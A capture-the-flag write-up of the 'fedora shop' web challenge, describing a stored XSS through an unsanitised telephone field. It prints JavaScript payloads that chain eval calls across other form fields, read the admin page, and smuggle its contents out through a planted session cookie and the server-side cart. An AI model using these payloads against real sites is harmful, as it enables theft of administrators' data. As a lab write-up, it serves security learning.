# fedora shop (web)

we get access to a online shop with fedoras (every hacker should wear one!):


[image extracted text: fedora
home
view cart
$1500.00
s800.00
$1500.00
white fedora
grey fedora
black fedora
add to cart
add to cart
add to cart
shop]


once we add some stuff to the cart, we can submit the order and there we can see that the order initially has status `pending approval` and after a a short while it gets changed to `shipped`.
it seems like a textbook example for a xss attack, so we try some injections in the fields of the order, and it turns out the "telephone" field is not sanitized properly and can be injected with javascript.
there are, however, some problems:

1. there is a limit to how long the fields in the order can be, and the telephone field can't fit a long payload, so we have very limited number of characters we can use there.
2. the task description says that the admin is behind a firewall, and it seems that he can't make any external connections. it means that even if we can execute xss code as admin, we can't really get the results back.


the first problem can be tackled by splitting the payload among other fields in the form and using the vulnerable field just as entry point. so there we put only:

```javascript
<script>
    window.onload=function(){
        eval(document.getelementsbytagname('td')[15].innertext);
    };
</script>
```

where the 15th `<td>` tag contains the contents of the field `other information`.
there we put:

```javascript
xhr = new xmlhttprequest();
xhr.open('get','/admin.php');
xhr.onreadystatechange = function() {
    if(xhr.readystate === xmlhttprequest.done){
        eval(document.getelementsbytagname('td')[14].innertext);
    }
};
xhr.send();
```

this will read the contents of the `admin.php` page for us and then it will invoke the script stored in 14th `<td>` which means contents of `address` field.
by using this approach we bypass the problem of running a long script.

the other issue is how to retrieve the data back from the server since admin can't connect to any external server.

we noticed that the cart is implemented server-side, so the information about the object we put there is stored on the server and retrieved by session id cookie.
the admin might not be able to connect to any external server, but can access the fedora shop as localhost, so we could potentially force the admin to place some things in a cart with specified session id.

initially we thought we will need to extract data character by character, by putting the ascii code of a single character as `quantity` of the fedoras to buy, but we noticed that there is no check if the field content is a number!
this meant we could simply put all of the contents at once with a single operation.
so the final part of the payload was:

```javascript
xhr = new xmlhttprequest();
xhr.open('post','/?action=add&code=wfedora',true);
xhr.withcredentials=true;
document.cookie='phpsessid=""" + session + """';
xhr.setrequestheader('content-type','application/x-www-form-urlencoded');
xhr.send('quantity='+this.responsetext);
```

once we run the attack we can see in our cart:


[image extracted text: your order is herel
name
code
quantity
rrice
action
white
remove
wfedora
dctf{946d6ca16c2f370b745cafof45ff2ac3656a3dcfee5d35cd8e853dc6d13470d}
$15d0.00
fedora
item
total: $0
email address
enter email
we'il never share your email with anyone else:
telephone
address
other relevant informations
order sumary
white fedora
wfedora x
dctf{946d6ca16c2f370b745cafo0f45ff2ac3656a3dcfee5d35cd8e853dc6d13470d} at 1500.00 each;]


whole attack script [here](fedora.py)
